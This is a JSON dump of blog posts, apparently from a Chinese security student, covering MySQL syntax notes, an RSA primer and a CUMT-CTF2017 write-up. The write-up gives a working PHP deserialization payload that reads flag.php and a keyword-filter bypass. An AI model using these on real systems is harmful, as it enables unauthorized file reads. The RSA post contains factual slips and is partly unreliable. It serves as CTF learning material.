函数会判断expr1是否为真，如果表达式为真则返回第二个参数，如果为假返回第三个参数。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"MySQL学习笔记(四)","slug":"MySql4","date":"2018-02-03T03:21:58.000Z","updated":"2018-02-04T06:51:31.365Z","comments":true,"path":"2018/02/03/MySql4/","link":"","permalink":"http://chaosec.top/2018/02/03/MySql4/","excerpt":"前言本次学习内容为MySQL索引与完整性约束，MySQL索引类似于书本的目录，是为了方便地找到要查找的数据。而完整性约束是指对数据的输入合法性等进行完整性约束检查。","text":"前言本次学习内容为MySQL索引与完整性约束，MySQL索引类似于书本的目录，是为了方便地找到要查找的数据。而完整性约束是指对数据的输入合法性等进行完整性约束检查。 MySQL索引索引及其作用MySQL索引的存储方式是另外存储一个文件来保存索引值，查找时通过索引定位到行的位置从而快速的查找数据。MySQL索引可以由最多15个列组成，最大索引长度 是256字节。 索引的分类由于索引是保存在文件中的，所以是要占据磁盘空间的，MySQL中一个表的索引都保存在一个索引文件夹中，如果增加删除或者更新表的一行，那么MySQL也会自动的更新索引，保证索引和表中的内容保持一致。 1、 BTREE索引 普通索引(INDEX) 这是最基本的索引，没有唯一性约束， 唯一性索引(UNIQUE) 唯一性索引，即每一列的索引值都只能出现一次，必须是唯一的。 主键(PRIMARY KEY) 主键索引，拥有唯一性索引的特点，但是一个表只能有一个主键。既可以在创建的时候指定，也可以通过修改表的方式加入主键。 全文索引(FULLTEXT) 全文索引只能在 VARCHAR 或者 TEXT 类型中使用，并且只能在MyISAM中创建。对于大规模数据集来说，通过 alter table或者 create index命令创建会更快一些。 2、 哈希索引(HASH) 当表类型为MEMORY或者HEAP时，MySQL还支持HASH索引，当根据一个值获取特定行时，哈希索引非常快。 MySQL索引创建create index123456create [unique | fulltext | spatial] index 索引名 [索引类型] on 表名 (索引列名,) [索引选项] ...索引列名=: 列名 [(长度)] [asc | desc] 说明 spatial为空间索引索引类型包括BTREE和HASHcreate index不能创建 主键索引列名，创建索引列名后的长度表示该列前面创建索引字符个数，这可以节省磁盘空间。 举例 根据sx表的学号列上的前5个字符建立一个升序索引xh_xs 12create index xh_xs on xs(学号(5) asc); alter table创建略 建表时创建索引略 删除索引1drop index 索引名 on 表名 或者 12345alter [ignore] table 表名...|drop primary key # 删除主键|drop &#123;index|key&#125; 索引名 # 删除索引|drop foreign key fk_symbo # 删除外键 CHECK完整性约束语法格式 1check(expr) 举例 1234567create table student( 学号 char(6) not null, 性别 char(1) not null check(性别 in ('男','女')))；","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"RSA算法初探","slug":"RSA初探","date":"2018-01-29T07:07:54.000Z","updated":"2018-01-29T07:42:06.323Z","comments":true,"path":"2018/01/29/RSA初探/","link":"","permalink":"http://chaosec.top/2018/01/29/RSA初探/","excerpt":"前言不得不承认我的数学真的是灰常灰常渣，研究了好久才差不多弄明白，真的感觉又被数学虐了o(╥﹏╥)o，不过打比赛需要掌握，咬着牙也得弄明白呀。","text":"前言不得不承认我的数学真的是灰常灰常渣，研究了好久才差不多弄明白，真的感觉又被数学虐了o(╥﹏╥)o，不过打比赛需要掌握，咬着牙也得弄明白呀。 正文我看许多的介绍文章都是先讲一大堆的数学公式然后再开始介绍RSA，给我一顿绕啊，愣是不知道在干什么，所以我想先介绍RSA，过程中需要什么数学理论再用什么理论，这样对于数学渣渣会友好一些。 RSA介绍 RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种非对称加密算法。今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战和质疑。RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。一句话，RSA是目前最重要的网络加密算法。 RSA密钥生成 第一步 选定两个质数p、q，实际应用中这两个数越大安全性越高。 第二步 计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是密钥长度，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。 第三步 计算n的 欧拉函数 φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表 第四步 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击这里 第五步 寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用扩展欧几里得算法 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。 第六步 封装（n，e1）为公钥 ，（n，e2）为私钥。 至此，所有准备工作完成。 加密和解密 先介绍一下加解密的公式，假定明文为A，那么， 密文B≡A^e1 mod n，要传输给对方的就是B 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。 假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(^▽^)。 假定要传输的明文为： 32 注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode 编码传输。 加密 A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密 解密 A = B^e2 mod n = 32 ，成功得到明文32！ RSA破解 所谓兵来将挡水来土掩，有人搞出来加密算法，就有人想搞出来破解算法，那么想要破解RSA能做到吗？我们不妨来看一下我们在整个过程中都用到了那些数据 p、q、n、φ（n），e1，e2 公钥用到了n，e1，只要我们能找到e2，就攻破了RSA。那么有没有可能通过这两个数找到e2呢？先看看e2是怎么来的 e1 * e2 mod φ（n） = 1 根据公式可以知道我们得到φ（n）就可以得到e2，那么φ（n）又是怎么来的呢？ φ（n）= （p-1）&#42;（q-1） 我们又需要得到p、q，再来 n = p * q 总算到了（开森）！我们只需要分解n就行了！！唉，不得不说，千里之堤毁于蚁穴，大名鼎鼎的RSA居然栽在了这么简单的问题上，哈哈哈！！ 但是~~，如果你真的觉得你就此就破解了RSA，那你真是Too Young Too Simple，分解我的n=35，洒洒水的难度，那么，请你给我分解一下下面这个数字怎么样、 152564564212344523123146785123123456484887123121231234567874645645132165867845456456456545645645123123123156445564523121322312312345645456456565656565 有办法吗？事实上，分解这些大数的因子是非常非常困难的，以目前的计算能力，分解1024位的大数需要两年，分解2048位的大数需要80年，远超数据本身的价值，这就是RSA算法牢不可破的真实原因，就是建立在大数分解困难的基础上的，所以今后如果计算能力提高，或者找到其它简单算法来分解大数，那么RSA算法安全性就消失了。 理论解释 是不是觉得刚刚的东西很神奇？！！，对，就是这么神奇，这背后都是伟大的数学家的功劳，虽然我不喜欢数学，但还是很佩服他们可以搞出这么骚的东西。废话不多说，来慢慢解释一下，鉴于我的数学水平… 数学解释只解释了所应用的数学原理，不再对数学原理进行证明，如果感兴趣的话可以自己证明之。 大名鼎鼎的 欧拉定理 若n,a为正整数，且n,a互质，则$a^{φ(n)} ≡ 1 （mod \\; n）$ φ（n）为 欧拉函数 ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质 如果n可以分解为两个互质的整数p、q的乘积，那么有φ（n）= (p-1) * (q-1) 接下来要证明的就是为什么下面两个式子可以互换实现 B=A^e1 mod nA=B^e2 mod n 解密规则为 A=B^e2 mod n 根据加密规则 B = A^e1 mod nB = A^e1 - kn 代入解密式中 (A^e1 - kn)^e2 ≡ A （mod n） 等于证 $A^{e1&#42;e2} ≡ m （mod \\; n）$，（对于这一步我并不知道为什么） 由 欧拉定理 可以得到 e1&#42;e2 ≡ 1 [ mod φ（n）]e1&#42;e2 ≡ hφ（n）+1 代入前面的式子可以得到 $A^{hφ（n）+1} \\;= m (mod\\;n)$ 接下来证明上述恒等式 分两种情况 1、A和n互质 由欧拉定理 $A^{φ（n）}≡1（mod\\;n）$ 代入前式可以得到 ${(A^{φ（n）})}^{h}&#42;A \\;= m (mod\\;n)$ 原式得证 2、A和n不互质 自己开发吧老铁，我不想写了。而且我也不怎么会。 RSA其实并不难，想要掌握它并不需要很高的数学基础，认真学一学还是可以学的明白的，废话不多说，赶紧练习一波去也！","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"http://chaosec.top/tags/RSA/"}]},{"title":"CUMT-CTF2017冬","slug":"cumtctf2017","date":"2018-01-27T07:46:56.000Z","updated":"2018-03-12T13:33:25.034Z","comments":true,"path":"2018/01/27/cumtctf2017/","link":"","permalink":"http://chaosec.top/2018/01/27/cumtctf2017/","excerpt":"第一次打ctf，感觉自己确实是个渣渣，不过万事开头难，有第一次总是好的，这次也让我意识到了自己的不足，自己要学的东西还是很多很多的。","text":"第一次打ctf，感觉自己确实是个渣渣，不过万事开头难，有第一次总是好的，这次也让我意识到了自己的不足，自己要学的东西还是很多很多的。 0x1 what？？一个代码审计问题,与反序列化有关 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php @error_reporting(1); class sky &#123; protected $skyobj; function __construct() &#123; $this-&gt;skyobj = new sec; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125; &#125; class nosec &#123; public $filename; function read() &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125; &#125; class sec &#123; function read() &#123; return \"it's so sec~~\"; &#125; &#125; if (isset($_GET['data'])) &#123; $Input_data = unserialize($_GET['data']); echo $Input_data; &#125;?&gt; PHP序列化的目的旨在实现不同的PHP文件之间的对象传递，在序列化对象创建之前，如果类中定义了&#95;&#95;sleep()函数，则会调用该函数，而在序列化对象创建时则会调用&#95;&#95;wakeup()函数（如果定义了的话），当然，还有PHP许多其他的魔法方法。分析一下，该例中关键应该在read函数上，但是必须要调用到nosec才可以实现，该例中sky类中默认创建sec类，显示是不行的，必须要创建出nosec才可以用。 payload 1234567891011121314151617181920212223&lt;?php @error_reporting(1); class sky &#123; protected $skyobj; function __construct() &#123; $this-&gt;skyobj = new nosec;//在此处更改对象，实现对象的绕过 &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125; &#125; class nosec &#123; public $filename='flag.php'; &#125;$obj = new sky();echo urlencode(serialize($obj)) //千万记住url编码，真的太多坑！！！！?&gt; O%3A3%3A%22sky%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A5%3A%22nosec%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D 直接提交上去即可获得编码。注意：以后一定要多检查元素，当时好像已经做出来了 ，可惜这个flag居然藏在控制台里面。同理，还可以利用该函数的特性去实现写文件等等操作。 0x2 代码混淆有个小知识点，vim会自动产生备份文件，比如文件名为submit.php，则产生的文件可能为.submit.swp，submit.php~，submit.php.bak多试试。然后就开始解混淆代码。 解混淆代码的时候，应该先把变量名提取出来，可以通过下面的代码dump变量出来 1234&lt;?phpinclude \"index.php\";var_dump(get_defined_vars());?&gt; 恢复出来的关键代码如下 1234567891011121314$IIIIIIIIIIll = @$_GET['img_tet'];$IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll);$IIIIIIIIIIll = str_replace('flag',\"\",$IIIIIIIIIIll);if ($IIIIIIIIIIll!=\"\")&#123; header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$IIIIIIIIIIll); header('Content-Lengh: '.filesize($IIIIIIIIIIll)); $IIIIIIIIII11 = fopen($IIIIIIIIIIll,\"r\") or die(\"Unable to open file!\"); $IIIIIIIIIlIl = fread($IIIIIIIIII11,filesize($IIIIIIIIIIll)); fclose($IIIIIIIIII11); echo $IIIIIIIIIlIl;&#125; 题目过滤flag，所以可以用flflagag绕过，即可得到flag，这个题其实也不难，只是毕竟是我第一次，需要纪念一下。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"MySQL学习笔记(三)","slug":"mysql3","date":"2018-01-18T05:13:19.000Z","updated":"2018-07-31T01:40:59.947Z","comments":true,"path":"2018/01/18/mysql3/","link":"","permalink":"http://chaosec.top/2018/01/18/mysql3/","excerpt":"Mysql操作表,例如SELECT语句等。","text":"Mysql操作表,例如SELECT语句等。 SELECT语句1234567891011121314151617select [all|distinct|distinctrow] # 指定是否重复行应被返回，如不指定默认值为all [high_priority] # 优先级设置 [straight_join] # 促使mysql把表联合在一起,加快查询速度 [sql_small_result] [sql_big_result] [sql_buffer_result] # 设置结果集的显示 [sql_cache|sql_no_cache] [sql_calc_found_rows] # cache指定是否要把结果集存储在查询表缓存中，第三个选项指定结果集的行数，忽略limit 列名表达式 ... [from 表或视图 ... [...]] [where 条件] [group by &#123;列名|表达式|position&#125; [asc|desc],... [with rollup]] [having 条件] [order by &#123;列名|表达式|position&#125; [asc|desc],...] [limit &#123;[offset,] row_count|row_count OFFSET offset&#125;] [procedure 存储过程名(参数...)] [into outfile &apos;文件名&apos; [character set 字符集] # 将表中的行导出到文件中 export_options|into dumpfile &apos;文件名&apos;|info 变量名 ...] [for update|lock in share mode]] # 对结果集加锁，for update更推荐 选择列as 指定列别名 1select 学号 as number from stu; # 指定结果集别名 替换查询结果中的数据12345678910111213case when 条件1 then 表达式1 when 条件2 then 表达式2 ... else 表达式nendEXP: select 编号,姓名 case when 编号 is null then &apos;ff&apos; else &apos;ok&apos; end from stuinfo; 计算列值123select 表达式 ... # 可以进行加减乘除取余%等运算exp：select 学号,成绩*1.2 from xs where ID=1; 聚合函数(aggregation function)聚合函数常用于对一组值进行计算，返回单个值，通常与group by子句一起使用,作用于列 函数名 说明 语法 备注 count 求组中系数，返回int类型数据 count({[all&#124;distinct] 表达式}&#124;*) &#42;将返回检索行总数目，包括其值包含null max 求最大值 max([all&#124;distinct] 表达式) 数据类型可以是数字、字符和时间日期类型 min 求最小值 略 sum 返回表中所有值的和 sum/avg([all&#124;distinct] 表达式) avg 组中平均值 std/stddev 返回标准差 variance 方差 group_concat 返回由属于一组的列值连接组合而成的结果 用法略 该函数返回指定列的所有非NULL值，中间用逗号隔开，长度最大限制1024 bit_and 逻辑或 bit_or 逻辑与 bit_xor 逻辑异或 FROM子句1234from table_reference ... table_reference:表名 [[as] 表名别名] [&#123;use|ignore|force&#125; index (key_list)] /*查询表，use指使用索引，ignore指忽略索引*/|join_table /*连接表*/ 多表连接1)全连接，实质是表的等值连接这种连接会产生所有可能的组合，也就是每个表的行数之积“select 编号,ID from stuinfo,student;”这样会返回两个表行数之积,通常需要用where语句限制结果行数2)JOIN连接123456join_table: table_reference [inner|cross] join table_factor [join_condition] |table_reference straight_join table_factor |table_reference straight_join table_factor on conditional_expr |table_reference &#123;LEFT|RIGHT&#125; [outer] join table_reference join_condition |table_reference natural [&#123;LEFT|RIGHT&#125; [outer]] join_table_factor table_reference指定要连接的表名join_condition：12on 条件|using (列...) on条件主要用于连接表，其他不属于连接表的条件可以使用where子句来指定，inner指内连接，是系统默认的方式。exp:1select 编号,ID from stuinfo join student; join还可以将自身进行连接，称为自连接，但是要指定不同的别名 WHERE子句where子句必须紧跟在from子句之后，用于确定选取行 1where 条件 其中条件为查询语句12345条件=: &lt;precdicate&gt; |&lt;precdicate&gt;&#123;and|or&#125;&lt;precdicate&gt; |(条件) |not 条件 precidicate为判定运算，结果又TRUE，FALSE或UNKNOWN123456789&lt;precdicate&gt;: 表达式 &#123;=|&lt;|&lt;=|&gt;=|&lt;=&gt;|&lt;&gt;|!=&#125; 表达式 # &quot;&lt;=&gt;&quot;相等或都等于空返回true，否则返回false，绝不会返回unknown |表达式 [not] like 表达式 [escape &apos;escape_character&apos;] |表达式 [not] [regexp|rlike] 表达式 |表达式 [not] between 表达式 and 表达式 |表达式 is [not] null |表达式[not] in (subquery |表达式[,...n]) |表达式 =|&lt;|&lt;=|&gt;=|&lt;=&gt;|&lt;&gt;|!=&#125; &#123;all|some|any&#125; (subquery) |exist (子查询) 模式匹配 1)like运算符1表达式 [not] like 表达式 [escape &apos;escape_character&apos;] 模式匹配时，可用%和_进行模糊查询，%代表0个或多个字符,符号_代表单个字符escape 转义字符，例如当要匹配的字符串中有_或%时，此时应通过该字符前的转义字符指明其为模式串中的字符，使用escape可以指定转义字符 2)regexp(正则表达式)，是mysql的一个功能。 1match_exp [not][regexp|rlike] match_exp 特殊字符 含义 ^ 匹配字符串的开始部分 $ 匹配字符串结束部分 . 匹配任何一个字符 * 匹配*之前的0个或多个字符的任何序列 + 匹配+之前的1个或多个字符的任何序列 ? 匹配？之前的0个或多个字符 {n} 匹配括号前的内容出现n次的序列 () 匹配括号里的内容 [abc] 略 [a-z] 略 a-z 略 &#124; 匹配符号左边或右边出现的字符串 [[..]] 匹配方括号里出现的符号 [[:&lt;:]和[[:&gt;:]] 匹配一个单词的开始和结束 [[:] 匹配方括号里出现的字符串中的任意一个字符 范围比较(between或者in)12exp [not] between exp1 and exp2 # exp1必须小于exp2，表达式也可是字符串exp in (exps [,...n]) # 该关键字主要用于表达子查询 空值比较1exp is [not] null 子查询 指使用另一个查询的结果作为条件的一部分，即查询的嵌套 1)in子查询1exp [not] in (subquery) in子查询只能返回一列数据，对于较复杂的查询可使用嵌套的子查询 2)比较子查询（使表达式的值与子查询的结果进行比较运算）1表达式 &#123;&lt;|&lt;=|=|&gt;|&gt;=|!=|&lt;&gt;&#125; &#123;all|some|any&#125; (subquery) all指定表达式要与结果集的每个值都进行比较，全部满足时才返回true，否则返回false。some与any同义，找到满足的值就会返回true，否则返回false。 3)exists子查询判断查询结果集是否为空表 1[not] exists (subquery) 以上各种子查询还可用在select的其他子句中，例如from语句，但是必须为子查询产生的一个中表定义一个别名 GROUP BY子句根据字段进行分组，所要查找的内容不得多于分组数1group by &#123;列名|表达式|position&#125; [asc|desc],... [with rollup] rollup用于对group by子句指定的各列产生汇总行。 举例 1select name,username from student where job='信息安全' group by username; 上述语句执行时会报错，原因在于 group by 语句的执行过程为先执行group by子句，然后对gruop by 语句的汇总行再进行操作，本例中group by子句执行后只产生了一列(列名为username)，所以执行到查询name字段时会无法查询从而报错。但是这个时候可以使用聚合函数来查询其他字段的信息，因为聚合函数可以作用于所有列，当然也可以增加group by 子句的字段 用例解析 1select 专业,性别,count(编号) from stuinfo group by 专业,性别 with rollup; 返回结果 专业 性别 count(编号) 信息安全 女 1 信息安全 男 4 信息安全 NULL 5 土木工程 男 6 土木工程 NULL 6 计算机 女 3 计算机 男 6 计算机 NULL 9 NULL NULL 20 1select 专业,性别,count(编号) from stuinfo group by 性别,专业 with rollup; 返回结果 专业 性别 count(编号) 信息安全 女 1 计算机 女 3 NULL 女 4 信息安全 男 4 土木工程 男 6 计算机 男 6 NULL 男 16 NULL NULL 20 以上两个查询语句只是group by语句后面的顺序不同，该语句的组织方式是按列的排序的逆序进行汇总，例如第一例先对性别字段产生了汇总（针对专业相同的行），然后对专业名和性别名均不同的行产生了汇总行，如果列数是多列的话，也依然会这样依次汇总。 HAVING子句HAVING子句用于在group by子句后选择行，和WHERE子句类似，where子句用于在from 子句后选择行，区别是 having子句可以作用于聚合函数，而where子句不可以。语法格式 1having 条件 举例 1select 专业,avg(年龄) from stuinfo where 年龄 &lt; 96 group by 专业 having avg(年龄); ORDER BY子句如果不适用order by子句的话，结果集中的行的顺序将是不可预料的，使用该语句行可以对行的排序顺序方式进行指定，如果order by子句后面指定了多个条件，则会按照逆序方向依次排序。1order by &#123;列名|表达式|position&#125; [asc|desc], ... position 表示结果集中该位置的列排序，是一个正整数。 举例 1select * from stuinfo order by 年龄; # 根据年龄来排序 LIMIT子句LIMIT子句用来限制 select 语句返回的行数。 语法格式 1LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125; 说明： offset 为对于结果集首行的偏移量（首行偏移量为0），如offset=3，则会从第四行开始返回数据。 举例 12select * from stuinfo where 专业='信息安全' limit 1,2;select * from stuinfo where 专业='信息安全' limit 2 offset 1; # 这两个语句是等价的 UNION语句UNION 语句用来把多个 select 语句返回的结果组合到一个结果集中。 语法格式 123select ...union [ALL | DISTINCT] select ...[ union [ALL | DISTINCT] select ... ] 说明 select语句为常规的select语句，但是必须遵守以下规则 1、各个select语句对应位置的列应该具有相同的列名、类型和数目，2、只有最后一个select语句可以使用 into outfile3、order by 和 limit 只能在整个语句最后指定，并对整个最终结果起作用。4、使用union语句的时候，MySQL会自动剔除重复数据，所以distinct可以省去。 举例 1select * from stuinfo where 专业='信息安全' union select * from stuinfo where 专业='土木工程' order by 5 limit 6; HANDLER 语句前面使用的 select 语句通常用来返回行的集合，MySQL中还有另外一个可以返回行的语句： handler 语句。它能够一行一行的浏览表中的数据，这不是SQL标准，而是MySQL 的一个扩展，只适用于MyISAM表和InnoDB表。使用该语句时要先打开一个表，然后在读这个表，使用完之后还必须关闭已经打开的表。 1、打开一个表 语法格式 1handler tablename open [ [ as ] 别名 ]; # as用于指定别名 2、 浏览表中的行 语法格式1 1handler tablename read &#123; first | next &#125; [where 条件] [limit ...]; 注意：此处的limit 字段用来控制返回的结果语句的行数，默认只有一行。 语法格式2 1234handler tablename read 索引名 &#123;&lt;|&gt;|=|...&#125; (值...) [where 条件] [limit ...]; # 以比较运算符为索引读取行handler tablename read 索引名 &#123;first | next | prev | last &#125; [where 条件] [limit ...]; # 以关键字来读取行 3、关闭打开的表 语法格式 1handler tablename close; 视图（view）此处只对视图进行简单的介绍。视图是从一个或多个表（视图）中导出（通过查询方式）的表，是一个 虚表 ，即数据库中只存储视图的结构不存储具体数据，需要时再在表中进行查询使用。使用方便，安全性高。 语法格式 123456create[or replace] # 用replace能替代同名视图[definer = &#123;user|current_user&#125;]view 视图名 [(列名 ...)]AS select 语句[with [cascaded|local] check option] 执行查询、修改、删除等操作时与对表的操作类似。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"MySQL学习笔记(二)","slug":"mysql2","date":"2018-01-07T14:16:20.000Z","updated":"2018-07-31T01:52:39.508Z","comments":true,"path":"2018/01/07/mysql2/","link":"","permalink":"http://chaosec.top/2018/01/07/mysql2/","excerpt":"Mysql数据库的增删查改","text":"Mysql数据库的增删查改 MYSQL基本命令 命令 解释 备注 show variables like ‘char%’; 显示系统中带有char字符的系统参数 set character_set_client gbk; 设置客户端编码方式为GBK status; 显示当前系统信息 delimiter $$ 修改命令结束符号为$$ 想要恢复；作为结束符使用 opdelimiter ; 数据库语句创建数据库12create [database|schema] [if not existe] databasename[options ...] 修改数据库12ALTER [DATABASE|SCHEMA] [DATABASENAME] OPTION ... 此命令用于修改数据库的全局特性，这些特性存在db.opt文件中，如果语句中忽略数据库名，则会修改当前数据库示例代码12alter database xscjdefault charcter set gb2312; 删除数据库DROP DATABASE DATABASENAME 表结构操作语句创建表12345create [temporary] table [if not exists] user( id int auto_increment not null primary key, username varchar(10) not null); # 使用ifnot...从句可以不显示错误信息 # unique key也可以表示字段名唯一 插入语句1insert into tablename values(1,&apos;Tom&apos;) # 字符串串值需要用引号括起来 复制现成的表123CREATE TABLE TABLE_NAME LIKE HAVED_TABLE; # 该命令会复制一个与已有表结构相同的空表CREATE TABLE TABLE_NAME AS (表达式ex：select * from haved_table); # 该命令是复制表达内容，但是表达式和索引不会复制，只会复制内容部分，例如主键特性就不会被复制 修改表修改表结构123456789101112ALTER [IGNORE] TABLE table_name option ...OPTIOIN:ADD [COLUMN] 列定义 [FIRST|AFTER 列名] /*添加列*/ALTER [COLUMN] 列名 &#123;SET DEFAULT literal|DROP DEAFAULT&#125; /*修改默认值*/CHANGE [COLUMN] 列名 愿列名 [FIRST|AFTER 列名] /*列名重定义*/MODIFY [COLUMN] 列定义 [FIRST|AFTER 列名] /*修改列数据类型*/DROP [COLUMN] 列名 /*删除列*/RANAME [TO] 列表名 /*重命名该表*/ORDER BY 列名 /*排序*/CONVERT TO CHARACTER SET 字符集名 [COLLATE 校对规则名] /*将字符集转换为二进制*/[DEFAULT] CHARACTER SET 字符集名 [COLLATE 校对规则名] /*修改默认字符集*/ 示例代码1231.alter table xs add column 性别 bit not null after 姓名; # 注意列名不加引号，加了会报错2.alter table xs change 备注 backup char(10); # 修改列名，先给出原列名，注意后面必须要加新列名的数据类型3.alter table xs modify backup char(11); # 修改列的数据类型，但是如果新的数据类型与所存的数据类型冲突则会错误 对于多条命令可以用，号隔开123alter table xs add 年级 tinyint, drop column 姓名; 更改表名1RENAME TABLE 老表名 TO 新表名 /*多个命令之间用逗号隔开*/ 删除表1DROP [TEMPORARY] TABLE [IF EXISTS] 表名 表结构特点1.表达空值与数值数据0或者空字符混为一谈，任意两个空值都不相等2.长度小于4的varchar被改变为char3.隐含的改变列类型 表记录操作插入记录4.1 插入新纪录 12345INSERT [LOW_PRIORITY|DELAYED|HIGH_PRIORITY] &#123;%raw%&#125;[IGNORE]&#123;%endraw%&#125; # low,delayed等表示该操作的优先级 [INTO] 表名 [(列名,...)] VALUES(&#123;expr|default&#125;,...),(,...),... |SET 列名=&#123;expr|default&#125;,... [ON DUPLICATE KEY UPDATE 列名=expr,..] # 该语句作用是如果发生unique key或primary key或primary出现重复，则按照该语句指定的列插入 4.2 从已有表中插入新记录 1234INSERT [LOW_PRIORITY|DELAYED|HIGH_PRIORITY] &#123;%raw%&#125;[IGNORE]&#123;%endraw%&#125; [INTO] 表名 [(列名,...)] SELECT 语句 [ON DUPLICATE KEY UPDATE 列名=expr,..] 4.3 替换旧记录 REPLACE 语句与insert相同，该语句会在插入之前将与新纪录冲突的旧记录删除，从而插入新数据4.4 插入图片可以插入路径或者直接存储图片本身(使用load_file()函数，参数为图片路径) 修改记录4.1 修改单个表 12345UPDATE [LOW_PRIORITY] [IGNORE] 表名 SET 列名1=expr1[,列名2=expr2...] [WHERE 条件] # 若没有设定，则会更新所有区行 [ORDER BY ...] [LIMIT row_count] 4.2 修改多个表 123UPDATE [LOW_PRIORITY] [IGNORE] 表名1,表名2,... SET 列名1=expr1[,列名2=expr2...] [WHERE 条件] 删除记录4.1单表操作1234delete [low_priority] [quick] from 表名 # quick修饰符可以加快部分删除操作的速度 [where 条件] [order by ...] [limit row_count] 2.多个表中操作123delete [low_priority] [quick] [ignore] 表名[.*][,表名[.*]...] from table_references [where ] 该语句删除from子句之前的表中的内容 或者1234delete [low_priority] [quick] [ignore] # 该语句删除from子句中的表中的内容 from 表名[.*][,表名[.*]...] using table_references [where] EXAMPE：123delete user1,user2 from user1,user2,user where user1.id=user.id and user2.id=user.id 清除表数据1truncate table 表名 # 清空表 数据库信息显示","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://chaosec.top/tags/SQL/"}]},{"title":"MySQL学习笔记(一)","slug":"Mysqldatatype","date":"2018-01-01T12:58:02.000Z","updated":"2018-01-25T07:17:24.416Z","comments":true,"path":"2018/01/01/Mysqldatatype/","link":"","permalink":"http://chaosec.top/2018/01/01/Mysqldatatype/","excerpt":"MySQL数据类型","text":"MySQL数据类型 MySQL数据类型在MYSQL数据类型主要有文本、数字、时间/日期类型 Numbe类型 数据类型 描述 TINYINT(size) -128 到 127 常规。0 到 255 无符号*。在括号中规定最大位数。 SMALLINT(size) -32768 到 32767 常规。0 到 65535 无符号*。在括号中规定最大位数。 MEDIUMINT(size) -8388608 到 8388607 普通。0 to 16777215 无符号*。在括号中规定最大位数。 INT(size) -2147483648 到 2147483647 常规。0 到 4294967295 无符号*。在括号中规定最大位数。 BIGINT(size) -9223372036854775808 到 9223372036854775807 常规。0 到 18446744073709551615 无符号*。在括号中规定最大位数。 FLOAT(size,d) 带有浮动小数点的小数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。 REAL(length,d) 和FLOAT类型差不多，运算速度快，但是精度有限。 DOUBLE(size,d) 带有浮动小数点的大数字。在括号中规定最大位数。在 d 参数中规定小数点右侧的最大位数。 DECIMAL(size,d) 作为字符串存储的 DOUBLE 类型，允许固定的小数点 BIT[M] 该数据类型在数据库中以1,0的形式存储，因此修改时只能用1,0或者true/false来存储 Date类型 数据类型 描述 DATE() 日期。格式：YYYY-MM-DD //注释：支持的范围是从 ‘1000-01-01’ 到 ‘9999-12-31’ DATETIME() 日期和时间的组合。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’ TIMESTAMP() 时间戳。TIMESTAMP 值使用 Unix 纪元(‘1970-01-01 00:00:00’ UTC) 至今的描述来存储。格式：YYYY-MM-DD HH:MM:SS // 注释：支持的范围是从 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-09 03:14:07’ UTC TIME() 时间。格式：HH:MM:SS 注释：支持的范围是从 